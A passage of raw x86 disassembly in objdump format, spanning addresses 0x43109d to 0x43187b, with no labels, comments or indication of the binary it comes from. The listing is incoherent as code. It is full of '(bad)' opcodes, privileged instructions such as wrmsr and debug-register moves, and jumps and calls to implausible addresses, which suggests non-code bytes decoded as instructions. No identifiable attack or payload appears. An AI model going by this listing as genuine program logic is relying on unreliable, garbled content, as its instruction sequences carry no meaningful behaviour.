  43109d:	add    BYTE PTR [ecx],al
  43109f:	test   DWORD PTR [eax],eax
  4310a1:	wrmsr  
  4310a3:	jae    0x431092
  4310a5:	add    BYTE PTR [eax],al
  4310a7:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4310ad:	add    esp,edi
  4310af:	add    BYTE PTR [eax+0x450108],al
  4310b5:	mov    edi,DWORD PTR [ebp-0x6c]
  4310b8:	add    DWORD PTR [eax],0x4
  4310bb:	mov    eax,DWORD PTR [ebp+0x3]
  4310be:	mov    edi,DWORD PTR [esp+edi*8]
  4310c1:	dec    ebp
  4310c2:	nop
  4310c3:	mov    eax,DWORD PTR [ecx]
  4310c5:	fadd   DWORD PTR [eax]
  4310c7:	add    BYTE PTR [esi],al
  4310c9:	lea    eax,[eax]
  4310cb:	pusha  
  4310cc:	push   eax
  4310cd:	inc    DWORD PTR [ebp+0x52]
  4310d0:	call   DWORD PTR [ebp-0x7b]
  4310d3:	mov    esi,DWORD PTR [ebp-0x74]
  4310d6:	mov    eax,DWORD PTR [eax]
  4310d8:	cld    
  4310d9:	mov    eax,DWORD PTR [eax+0x880103]
  4310df:	add    BYTE PTR [ebp+0x6a],bh
  4310e2:	cmp    edi,0x10
  4310e5:	mov    WORD PTR [ebp+0x0],es
  4310e8:	mov    edx,DWORD PTR [edx-0x4]
  4310eb:	push   ecx
  4310ec:	nop
  4310ed:	inc    DWORD PTR [ecx]
  4310ef:	cld    
  4310f0:	add    BYTE PTR [ebp-0x24],bh
  4310f3:	mov    eax,DWORD PTR [eax]
  4310f5:	cld    
  4310f6:	push   eax
  4310f7:	nop
  4310f8:	inc    ebp
  4310f9:	add    edi,edi
  4310fb:	add    BYTE PTR [ebx+0x4de2f445],cl
  431101:	jmp    0xe33b:0x9403c733
  431108:	movntq QWORD PTR [esi],mm6
  43110b:	mov    DWORD PTR [eax],0xb87e8b98
  431111:	test   ebx,eax
  431113:	jmp    DWORD PTR [edi-0x1]
  431116:	int    0xe9
  431118:	sub    esp,esi
  43111a:	add    eax,DWORD PTR [ebp-0x30]
  43111d:	fild   WORD PTR [ebp+0x3f]
  431120:	cmp    eax,edi
  431122:	je     0xcc43f744
  431128:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  43112f:	(bad)  
  431130:	jne    0x4310be
  431132:	mov    ebx,ecx
  431134:	cld    
  431135:	jle    0x43117c
  431137:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  43113d:	inc    ebp
  43113e:	call   0xeb3ace
  431143:	add    BYTE PTR [ebx-0x7f170301],cl
  431149:	add    DWORD PTR es:[eax],eax
  43114c:	add    al,al
  43114e:	xor    BYTE PTR [eax+0x41],dl
  431151:	inc    ebp
  431152:	add    BYTE PTR [ebx+0xfcd88b],cl
  431158:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  43115e:	add    DWORD PTR [ecx+0x458be845],ecx
  431164:	fmul   DWORD PTR [ebx+0x8bb800]
  43116a:	cld    
  43116b:	call   0xd83c30
  431170:	dec    DWORD PTR [ebx+0x1090e8ff]
  431176:	add    al,al
  431178:	push   eax
  431179:	es inc ebp
  43117b:	inc    ebp
  43117c:	mov    ecx,DWORD PTR [ebx+0xd89c]
  431182:	dec    DWORD PTR [ebx-0x3ff70301]
  431188:	mov    DWORD PTR gs:[eax],eax
  43118b:	call   0x8b6b5750
  431190:	inc    ebp
  431191:	mov    eax,0xe8d8008b
  431196:	add    BYTE PTR [ecx],ch
  431198:	mov    eax,DWORD PTR [eax]
  43119a:	cld    
  43119b:	mov    eax,eax
  43119d:	call   0x462b21f7
  4311a2:	sub    DWORD PTR [ebx-0x3c743000],ecx
  4311a8:	cld    
  4311a9:	mov    BYTE PTR [eax+0x8401c1],0x1
  4311b0:	xor    BYTE PTR [eax],al
  4311b2:	push   edi
  4311b3:	inc    ebp
  4311b4:	mov    DWORD PTR [ebx],esi
  4311b6:	in     al,0xb9
  4311b8:	inc    ebp
  4311b9:	lea    ecx,[ebx-0x3c370301]
  4311bf:	dec    ebp
  4311c0:	cdq    
  4311c1:	mov    esi,DWORD PTR [edx]
  4311c3:	or     BYTE PTR [ebx],al
  4311c5:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4311cc:	call   0x433b16
  4311d1:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4311d7:	jge    0x43120c
  4311d9:	mov    eax,DWORD PTR [ebx]
  4311db:	cld    
  4311dc:	lea    edx,[eax+0xff0120]
  4311e2:	call   0x433b76
  4311e7:	push   eax
  4311e8:	inc    DWORD PTR [ebp-0x1c]
  4311eb:	mov    ecx,DWORD PTR [ebp-0x58]
  4311ee:	xor    eax,DWORD PTR [eax]
  4311f0:	add    edi,edi
  4311f2:	cmp    ebp,eax
  4311f4:	jne    0x43121c
  4311f6:	mov    DWORD PTR [eax],0x8b004dd8
  4311fc:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  431203:	mov    eax,ebx
  431205:	cld    
  431206:	test   BYTE PTR [eax+0x320199],bh
  43120c:	mov    DWORD PTR [ebp+0x8],esi
  43120f:	xor    eax,DWORD PTR [ebp-0x73]
  431212:	test   DWORD PTR [esp+esi*2-0x1],edi
  431216:	mov    ebp,eax
  431218:	mov    eax,0x33004d29
  43121d:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  431223:	add    DWORD PTR [eax],eax
  431225:	add    BYTE PTR [ebp+0x30],al
  431228:	mov    edx,DWORD PTR [edi-0x48]
  43122b:	add    ebx,0xffffffe4
  43122e:	addr16 test ebp,ecx
  431231:	je     0x43125e
  431233:	mov    eax,DWORD PTR [ebx]
  431235:	cld    
  431236:	sar    BYTE PTR [eax+0x3b0145],1
  43123c:	pcmpeqw mm4,mm6
  43123f:	xor    edi,edi
  431241:	lea    ecx,[ebx-0x239c7470]
  431247:	add    BYTE PTR [ebp+0x50],cl
  43124a:	cmp    eax,DWORD PTR [ebp+0x75]
  43124d:	mov    ebp,DWORD PTR [eax-0x68]
  431250:	test   DWORD PTR [eax],eax
  431252:	clc    
  431253:	push   DWORD PTR [ebp-0x1]
  431256:	lea    ecx,[eax]
  431258:	int3   
  431259:	inc    ebp
  43125a:	call   0xfb42ea
  43125f:	jne    0x431259
  431261:	xor    edi,DWORD PTR [ebp-0x41]
  431264:	jmp    0x4312d8
  431266:	mov    eax,DWORD PTR [eax]
  431268:	mov    eax,0x339545c7
  43126d:	inc    DWORD PTR [ebx]
  43126f:	push   DWORD PTR [ecx]
  431271:	aaa    
  431272:	mov    eax,DWORD PTR [eax]
  431274:	jmp    0x4312c6
  431276:	mov    eax,DWORD PTR [ebp-0x3c]
  431279:	mov    eax,eax
  43127b:	cld    
  43127c:	clc    
  43127d:	ret    
  43127e:	test   bh,al
  431280:	pop    es
  431281:	xchg   ebp,eax
  431282:	add    bh,bh
  431284:	inc    ebp
  431285:	dec    DWORD PTR [edi]
  431287:	and    DWORD PTR [ebx],ebp
  431289:	add    BYTE PTR [eax],al
  43128b:	push   eax
  43128c:	jbe    0x4312e3
  43128e:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  431294:	or     al,0xcf
  431296:	inc    eax
  431297:	enter  0x745,0x72
  43129b:	inc    ebp
  43129c:	mov    eax,DWORD PTR [ecx]
  43129e:	int3   
  43129f:	add    BYTE PTR [ebp-0x75],al
  4312a2:	ss mov eax,0x33c74d9c
  4312a8:	ror    BYTE PTR [ebp+0x72f80885],1
  4312ae:	inc    ebp
  4312af:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4312b5:	fadd   st,st(6)
  4312b7:	rol    BYTE PTR [ebp+0x12],0x8b
  4312bb:	inc    ebp
  4312bc:	fmul   QWORD PTR [ebx-0x3c39233d]
  4312c2:	inc    ebp
  4312c3:	test   bh,al
  4312c5:	cdq    
  4312c6:	clc    
  4312c7:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4312cd:	inc    ebp
  4312ce:	cmp    BYTE PTR [ebx],dh
  4312d0:	pushf  
  4312d1:	mov    ecx,0xffb48dc7
  4312d6:	test   eax,ecx
  4312d8:	clc    
  4312d9:	dec    ebp
  4312da:	inc    ebp
  4312db:	mov    edi,DWORD PTR [edx]
  4312dd:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4312e4:	test   edi,edi
  4312e6:	clc    
  4312e7:	test   DWORD PTR [ebp+0x45],0x89c8b3c
  4312ee:	(bad)  
  4312ef:	enter  0x18e8,0x85
  4312f3:	ss clc 
  4312f5:	pushf  
  4312f6:	inc    ebp
  4312f7:	dec    DWORD PTR [ebx-0x3cba0f04]
  4312fd:	push   eax
  4312fe:	xabort 0x7d
  431301:	add    BYTE PTR [ebx],bh
  431303:	mov    ecx,DWORD PTR [edi]
  431305:	mov    DWORD PTR [eax],ebx
  431307:	les    eax,FWORD PTR [eax]
  431309:	adc    ebp,ecx
  43130b:	dec    ebp
  43130c:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  431312:	mov    ecx,esi
  431314:	lock or al,cl
  431317:	clc    
  431318:	inc    ebp
  431319:	add    esi,DWORD PTR [ebx]
  43131b:	jge    0x431320
  43131d:	xor    edi,DWORD PTR [ebx]
  43131f:	cmp    ecx,DWORD PTR [edi]
  431321:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  431326:	mov    edi,DWORD PTR [ecx]
  431328:	test   al,0xcc
  43132a:	dec    ebp
  43132b:	test   BYTE PTR [ebx],dh
  43132d:	pop    es
  43132e:	xor    eax,DWORD PTR [eax]
  431330:	add    ecx,DWORD PTR [esi]
  431332:	add    ecx,eax
  431334:	psraw  mm0,mm1
  431337:	sub    BYTE PTR [ebp+0x38],cl
  43133a:	mov    edi,DWORD PTR [ebx]
  43133c:	lock int3 
  43133e:	shl    edx,1
  431340:	rol    BYTE PTR [ebp+0xc],1
  431343:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43134a:	jmp    0x7c1394
  43134f:	pushf  
  431350:	inc    ebp
  431351:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  431357:	xor    ecx,ebx
  431359:	add    ecx,esi
  43135b:	mov    esi,eax
  43135d:	enter  0x45af,0x8b
  431361:	xor    ecx,eax
  431363:	add    edx,DWORD PTR [ebp-0x77]
  431366:	sub    ecx,DWORD PTR [eax]
  431368:	cmp    eax,DWORD PTR [ebp+0x77]
  43136b:	(bad)  
  43136c:	mov    ebx,DWORD PTR [eax+ebp*4+0xa889c7]
  431373:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  431379:	cmp    esi,DWORD PTR [ebx]
  43137b:	pushf  
  43137c:	xor    eax,edi
  43137e:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  431385:	inc    ebp
  431386:	dec    ebp
  431387:	cmp    eax,0xc7f09c8b
  43138c:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  431393:	inc    ebp
  431394:	jmp    0x4313d5
  431396:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43139d:	dec    ebp
  43139e:	xor    esi,DWORD PTR [ebx]
  4313a0:	add    eax,DWORD PTR [ebx]
  4313a2:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  4313a8:	dec    ebp
  4313a9:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4313af:	out    dx,eax
  4313b0:	rol    BYTE PTR [eax],1
  4313b2:	add    eax,0xebc8458b
  4313b7:	dec    ebp
  4313b8:	mov    ebp,DWORD PTR [ebx]
  4313ba:	mov    esp,0x33f84d8b
  4313bf:	ret    
  4313c0:	xor    eax,esi
  4313c2:	add    ecx,eax
  4313c4:	add    eax,DWORD PTR [edx+0xc1010f]
  4313ca:	dec    ebp
  4313cb:	inc    ebp
  4313cc:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4313d2:	ror    bl,1
  4313d4:	add    eax,0xebc645ce
  4313d9:	scas   eax,DWORD PTR es:[edi]
  4313da:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4313e0:	xor    ebp,DWORD PTR [ebx]
  4313e2:	xor    edi,DWORD PTR [ebx]
  4313e4:	add    esi,DWORD PTR [edi+0x3]
  4313e7:	mov    ecx,DWORD PTR [edi]
  4313e9:	clc    
  4313ea:	rol    ebx,0x4d
  4313ed:	(bad)  
  4313ee:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4313f5:	mov    ah,0x45
  4313f7:	dec    ebp
  4313f8:	jbe    0x43142d
  4313fa:	mov    esi,DWORD PTR [ebx]
  4313fc:	call   0x33466104
  431401:	rdpmc  
  431403:	rol    DWORD PTR [ebx],0x4d
  431406:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43140c:	inc    ebp
  43140d:	ror    BYTE PTR [ebx+0x45450808],1
  431413:	jmp    0x10b14a3
  431418:	inc    ebp
  431419:	inc    ebp
  43141a:	(bad)  
  43141b:	mov    ebx,eax
  43141d:	clc    
  43141e:	test   ebx,eax
  431420:	clc    
  431421:	retf   
  431422:	inc    ebp
  431423:	into   
  431424:	mov    esi,0x8b85afec
  43142a:	clc    
  43142b:	enter  0x5545,0x38
  43142f:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  431436:	ret    
  431437:	mov    ah,0xc6
  431439:	addr16 push 0x338b4545
  43143f:	clc    
  431440:	add    eax,ebx
  431442:	loopne 0x43140f
  431444:	dec    ebp
  431445:	into   
  431446:	mov    al,dh
  431448:	or     BYTE PTR [edi-0x37ff748e],ch
  43144e:	inc    ebp
  43144f:	push   ebp
  431450:	mov    ebp,DWORD PTR [ebx]
  431452:	in     al,dx
  431453:	cmp    eax,ebx
  431455:	ja     0x43149c
  431457:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43145d:	inc    ebp
  43145e:	cdq    
  43145f:	mov    esi,DWORD PTR [edx]
  431461:	clc    
  431462:	mov    bl,al
  431464:	xlat   BYTE PTR ds:[ebx]
  431465:	retf   
  431466:	inc    ebp
  431467:	into   
  431468:	mov    eax,esi
  43146a:	in     al,dx
  43146b:	scas   eax,DWORD PTR es:[edi]
  43146c:	retf   
  43146d:	mov    ecx,DWORD PTR [ebp-0x38]
  431470:	mov    edx,DWORD PTR [ebp-0x24]
  431473:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8867]
  43147a:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  431481:	mov    eax,DWORD PTR [ebx]
  431483:	clc    
  431484:	loopne 0x431449
  431486:	push   ebp
  431487:	retf   
  431488:	mov    dh,al
  43148a:	adc    esi,ecx
  43148c:	jb     0x43143d
  43148e:	add    BYTE PTR [ebx+0x558bc845],cl
  431494:	in     al,dx
  431495:	sub    eax,ebx
  431497:	cmp    ecx,ebx
  431499:	mov    eax,esi
  43149b:	mov    esp,0x45af03ce
  4314a0:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  4314a6:	mov    eax,ebx
  4314a8:	in     al,dx
  4314a9:	into   
  4314aa:	dec    ebp
  4314ab:	(bad)  
  4314ac:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4314b2:	rol    DWORD PTR [ebp+0x4d],0x89
  4314b6:	xor    esp,esp
  4314b8:	sub    eax,DWORD PTR [ebp-0x75]
  4314bb:	add    ebp,esp
  4314bd:	mov    al,0x55
  4314bf:	inc    ebp
  4314c0:	xor    esi,DWORD PTR [esi]
  4314c2:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4314c9:	inc    ebp
  4314ca:	xor    edi,DWORD PTR [ecx]
  4314cc:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4314d3:	test   DWORD PTR [eax],eax
  4314d5:	clc    
  4314d6:	enter  0x8645,0x33
  4314da:	inc    DWORD PTR [ebx]
  4314dc:	(bad)  
  4314dd:	jmp    0x431524
  4314df:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4314e5:	inc    ebp
  4314e6:	(bad)  
  4314e7:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4314ed:	cdq    
  4314ee:	retf   
  4314ef:	xor    al,cl
  4314f1:	mov    BYTE PTR [ebp+0xb],cl
  4314f4:	lea    eax,[ebp+0x8]
  4314f7:	xor    esi,DWORD PTR [edx+0x3]
  4314fa:	add    al,ah
  4314fc:	inc    ebp
  4314fd:	dec    ebp
  4314fe:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  431504:	addr16 add ch,cl
  431507:	inc    ebp
  431508:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  43150e:	inc    ebp
  43150f:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  431515:	push   ebp
  431516:	(bad)  
  431517:	mov    BYTE PTR [edi+0xf723b11],ch
  43151d:	add    ch,ch
  43151f:	inc    ebp
  431520:	dec    DWORD PTR [ebx-0x34332775]
  431526:	add    al,0x4d
  431528:	inc    ebp
  431529:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  43152f:	cdq    
  431530:	add    DWORD PTR [edx],esi
  431532:	add    BYTE PTR [ebx+0x4d00c000],cl
  431538:	push   DWORD PTR [ebx]
  43153a:	int3   
  43153b:	xor    eax,DWORD PTR [eax]
  43153d:	add    edx,DWORD PTR [eax+0x3]
  431540:	mov    DWORD PTR [edi],ecx
  431542:	call   0x4288d608
  431547:	mov    DWORD PTR [ebp-0x20],esp
  43154a:	add    BYTE PTR [ebp+0x7d],al
  43154d:	mov    eax,DWORD PTR [eax]
  43154f:	in     al,0x15
  431551:	ret    
  431552:	iret   
  431553:	(bad)  
  431554:	enter  0x14af,0x8b
  431558:	(bad)  
  431559:	in     al,dx
  43155a:	or     bl,cl
  43155c:	adc    cl,al
  43155e:	push   ebp
  43155f:	dec    ebp
  431560:	inc    eax
  431561:	mov    edx,DWORD PTR [ebp-0x20]
  431564:	jb     0x431531
  431566:	mov    ecx,esi
  431568:	cld    
  431569:	scas   eax,DWORD PTR es:[edi]
  43156a:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  431571:	mov    BYTE PTR [eax],0x8c
  431574:	push   0xffffff99
  431576:	push   edi
  431577:	xor    dl,BYTE PTR [eax+0x3b]
  43157a:	mov    ecx,DWORD PTR [edi]
  43157c:	call   0x8c425adf
  431581:	mov    eax,eax
  431583:	in     al,dx
  431584:	jge    0x4315d3
  431586:	mov    DWORD PTR [ebx],esi
  431588:	int3   
  431589:	add    eax,DWORD PTR [ebp+0xf]
  43158c:	xor    eax,ecx
  43158e:	(bad)  
  43158f:	dec    ebp
  431590:	pushf  
  431591:	xor    ecx,esi
  431593:	add    edi,DWORD PTR [edi]
  431595:	mov    eax,DWORD PTR [ebp-0x38]
  431598:	(bad)  
  431599:	test   dh,dl
  43159b:	cdq    
  43159c:	add    esi,DWORD PTR [edx]
  43159e:	jmp    0x431529
  4315a0:	mov    cl,al
  4315a2:	add    eax,0x14330f45
  4315a7:	mov    ecx,0xff448d80
  4315ac:	jmp    0xc9902579
  4315b1:	mov    edx,ecx
  4315b3:	rol    BYTE PTR [ebp+0x330155],1
  4315b9:	add    ecx,DWORD PTR [ebp+0xf]
  4315bc:	xor    eax,edx
  4315be:	(bad)  
  4315bf:	ror    DWORD PTR [eax],0x86
  4315c2:	jb     0x4315c1
  4315c4:	add    bh,bh
  4315c6:	clc    
  4315c7:	inc    ebp
  4315c8:	jb     0x431634
  4315ca:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4315d0:	mov    ebx,DWORD PTR ss:[eax+ebx*8+0x68c000c7]
  4315d8:	ret    
  4315d9:	xor    al,bh
  4315db:	add    BYTE PTR [ebp+0x75],al
  4315de:	ss push 0xffffff9c
  4315e1:	inc    edi
  4315e3:	adc    al,0xe8
  4315e5:	inc    ebp
  4315e6:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4315ec:	mov    ecx,DWORD PTR [eax]
  4315ee:	cld    
  4315ef:	or     DWORD PTR [ebp-0x34],0x33
  4315f3:	jbe    0x4315f8
  4315f5:	mov    edx,DWORD PTR [ecx+0x2b]
  4315f8:	dec    ebp
  4315f9:	mov    cl,BYTE PTR [ebx+0x45d801]
  4315ff:	mov    BYTE PTR [ebx],dh
  431601:	mov    eax,DWORD PTR [ebx]
  431603:	or     BYTE PTR [ecx+0x3b],dl
  431606:	dec    ebp
  431607:	int3   
  431608:	xor    ebp,edi
  43160a:	add    eax,DWORD PTR [ebp+0x51]
  43160d:	mov    ecx,DWORD PTR [ebp-0x28]
  431610:	xor    eax,DWORD PTR [eax]
  431612:	add    ebp,DWORD PTR [eax+0x51]
  431615:	adc    BYTE PTR [eax+0x0],0x8b
  431619:	add    BYTE PTR [ebx+0x4d18fcff],cl
  43161f:	inc    ebp
  431620:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  431626:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43162c:	dec    ebp
  43162d:	mov    esi,DWORD PTR [ebx]
  43162f:	hlt    
  431630:	add    eax,ebx
  431632:	push   ecx
  431633:	inc    ebp
  431634:	dec    ebp
  431635:	(bad)  
  431636:	call   esi
  431638:	in     al,0xc7
  43163a:	retf   
  43163b:	mov    al,ds:0xc1ff39ce
  431640:	adc    al,0xc6
  431642:	inc    ebp
  431643:	and    eax,0x9c0f4c85
  431648:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  43164f:	cmp    BYTE PTR [ebx+0x3a],0x0
  431653:	mov    dh,0xc7
  431655:	cmp    eax,eax
  431657:	jne    0x45440ea3
  43165d:	mov    edi,DWORD PTR [eax]
  43165f:	mov    eax,0x848bcb9c
  431664:	rcr    BYTE PTR [ecx-0x7c7fcd0f],0x67
  43166b:	or     BYTE PTR [edi],cl
  43166d:	(bad)  
  43166e:	dec    ebp
  43166f:	inc    edi
  431670:	add    bh,0x51
  431673:	or     cl,ch
  431675:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43167b:	xchg   DWORD PTR [eax-0x1638ae64],eax
  431681:	mov    esp,0xf802b588
  431686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431687:	inc    ebp
  431688:	(bad)  
  431689:	cmp    bh,bh
  43168b:	pushf  
  43168c:	or     DWORD PTR [ecx+0x45ffe474],0x0
  431693:	mov    ecx,DWORD PTR [ebp-0x340018]
  431699:	into   
  43169a:	dec    DWORD PTR [ebx-0x7f72431c]
  4316a0:	push   0x5000ff01
  4316a5:	retf   
  4316a6:	inc    ebp
  4316a7:	into   
  4316a8:	dec    DWORD PTR [ebx-0x343f3ff4]
  4316ae:	push   eax
  4316af:	into   
  4316b0:	call   0x4b1b40
  4316b5:	retf   
  4316b6:	add    dh,cl
  4316b8:	add    bh,bh
  4316ba:	mov    DWORD PTR [eax+ecx*1],edx
  4316bd:	clc    
  4316be:	inc    ebp
  4316bf:	inc    ebp
  4316c0:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4316c6:	push   0x1
  4316c8:	push   edi
  4316c9:	add    BYTE PTR [eax-0x35],dl
  4316cc:	mov    ecx,esi
  4316ce:	cld    
  4316cf:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4316d5:	into   
  4316d6:	ror    BYTE PTR [ebx+0x75000800],0x50
  4316dd:	xor    eax,DWORD PTR [ebp+0x3]
  4316e0:	jne    0x431733
  4316e2:	call   DWORD PTR [eax-0x3c]
  4316e5:	mov    DWORD PTR [ecx-0x18],edx
  4316e8:	mov    edi,edi
  4316ea:	call   0x8b465c73
  4316ef:	add    ah,ah
  4316f1:	rol    BYTE PTR [ebp-0x7c],0xeb
  4316f5:	add    edi,edi
  4316f7:	add    al,ch
  4316f9:	inc    ebp
  4316fa:	push   ecx
  4316fb:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  431701:	mov    al,0xc7
  431703:	test   esp,esp
  431705:	clc    
  431706:	test   DWORD PTR [ebp-0x8],ecx
  431709:	add    BYTE PTR [ebp+0x51],0x39
  43170d:	jmp    0x8bcc9fae
  431712:	in     al,dx
  431713:	or     BYTE PTR [ebp-0xf],al
  431716:	xor    eax,DWORD PTR [eax+0x4f896703]
  43171c:	hlt    
  43171d:	mov    eax,DWORD PTR [ebp-0x50]
  431720:	xor    esi,ecx
  431722:	add    eax,DWORD PTR [eax+0x4f086789]
  431728:	inc    ebp
  431729:	adc    esi,0x68
  43172c:	pushf  
  43172d:	inc    edi
  43172f:	add    al,ch
  431731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431732:	test   edi,edi
  431734:	clc    
  431735:	inc    DWORD PTR [ebp-0x73]
  431738:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  43173c:	(bad)  
  43173d:	push   ecx
  43173e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43173f:	jne    0x4316c6
  431741:	push   eax
  431742:	clc    
  431743:	test   DWORD PTR [ebp-0x1],eax
  431746:	cmp    eax,0xc78b9cff
  43174b:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  431752:	inc    ebp
  431753:	push   edi
  431754:	aas    
  431755:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  43175c:	dec    ebp
  43175d:	add    BYTE PTR [ebx],dh
  43175f:	inc    ebp
  431760:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  431766:	enter  0x8401,0x0
  43176a:	add    al,BYTE PTR [eax]
  43176c:	add    bh,bh
  43176e:	out    dx,eax
  43176f:	sbb    BYTE PTR [eax],al
  431771:	dec    ebp
  431772:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  431778:	sub    esi,DWORD PTR [ebx]
  43177a:	mov    ebp,DWORD PTR [eax-0x8]
  43177d:	add    bl,0x0
  431780:	(bad)  
  431781:	cmp    eax,ecx
  431783:	or     BYTE PTR [edx+0x750114],al
  431789:	inc    DWORD PTR [ebp+0x18]
  43178c:	mov    eax,DWORD PTR [ebp-0x8]
  43178f:	mov    ebx,eax
  431791:	(bad)  
  431792:	retf   
  431793:	inc    ebp
  431794:	into   
  431795:	mov    esi,eax
  431797:	int3   
  431798:	scas   eax,DWORD PTR es:[edi]
  431799:	push   es
  43179a:	mov    esi,DWORD PTR [ebp-0xc]
  43179d:	call   DWORD PTR [ebp+0x18]
  4317a0:	sub    edi,DWORD PTR [ebp+0x3b]
  4317a3:	mov    esi,DWORD PTR [edi-0x34]
  4317a6:	mov    eax,DWORD PTR [ebp-0x8]
  4317a9:	ss ret 
  4317ab:	pushf  
  4317ac:	mov    bh,0xbc
  4317af:	fadd   QWORD PTR [eax]
  4317b1:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  4317b7:	mov    esi,DWORD PTR [ebx]
  4317b9:	in     al,0x33
  4317bb:	ret    
  4317bc:	add    eax,esi
  4317be:	add    eax,DWORD PTR [ebp+0xf]
  4317c1:	mov    eax,ecx
  4317c3:	in     al,0x4d
  4317c5:	ret    
  4317c6:	mov    eax,esi
  4317c8:	in     al,dx
  4317c9:	inc    ebp
  4317ca:	rol    edi,1
  4317cc:	sar    al,1
  4317ce:	or     BYTE PTR [ebp+0x45e9f845],al
  4317d4:	add    BYTE PTR [eax],bh
  4317d6:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4317dd:	test   ebx,eax
  4317df:	clc    
  4317e0:	retf   
  4317e1:	inc    ebp
  4317e2:	into   
  4317e3:	cmp    al,dh
  4317e5:	pushf  
  4317e6:	scas   eax,DWORD PTR es:[edi]
  4317e7:	(bad)  
  4317e8:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4317ef:	inc    ebp
  4317f0:	cmp    edi,DWORD PTR [edi+esi*2]
  4317f3:	pushf  
  4317f4:	mov    eax,edi
  4317f6:	mov    esp,0x458567a8
  4317fb:	clc    
  4317fc:	mov    eax,DWORD PTR [ebp-0x8]
  4317ff:	mov    eax,ebx
  431801:	in     al,dx
  431802:	retf   
  431803:	ret    
  431804:	into   
  431805:	mov    dh,0x7d
  431808:	scas   eax,DWORD PTR es:[edi]
  431809:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  43180f:	add    BYTE PTR [ebx],ch
  431811:	jmp    0xba1951
  431816:	mov    eax,DWORD PTR [ebp-0x5c]
  431819:	mov    eax,DWORD PTR [ebp-0x14]
  43181c:	inc    ebp
  43181d:	enter  0x458b,0xf8
  431821:	xor    eax,ebx
  431823:	add    ecx,ebx
  431825:	cmp    ecx,esi
  431827:	shufps xmm7,xmm4,0xaf
  43182b:	add    BYTE PTR [ebx+0x55e8f48b],cl
  431831:	dec    ebp
  431832:	sub    esi,DWORD PTR [ebx]
  431834:	cmp    esi,DWORD PTR [ebx]
  431836:	ja     0x43183b
  431838:	mov    eax,DWORD PTR [ebx]
  43183a:	lods   al,BYTE PTR ds:[esi]
  43183b:	mov    db0,ecx
  43183e:	inc    ebp
  43183f:	dec    ebp
  431840:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  431846:	retf   
  431847:	rol    dh,1
  431849:	or     al,0xce
  43184b:	inc    ebp
  43184c:	scas   eax,DWORD PTR es:[edi]
  43184d:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  431853:	add    BYTE PTR [ebx],ch
  431855:	add    BYTE PTR [ebx],bh
  431857:	inc    ebp
  431858:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  43185e:	inc    ebp
  43185f:	retf   
  431860:	mov    ecx,esi
  431862:	clc    
  431863:	(bad)  
  431864:	retf   
  431865:	scas   eax,DWORD PTR es:[edi]
  431866:	ret    
  431867:	mov    ecx,esi
  431869:	hlt    
  43186a:	(bad)  
  43186b:	push   ebp
  43186c:	scas   eax,DWORD PTR es:[edi]
  43186d:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  431873:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  431879:	add    BYTE PTR [ebx],al
  43187b:	mov    eax,eax
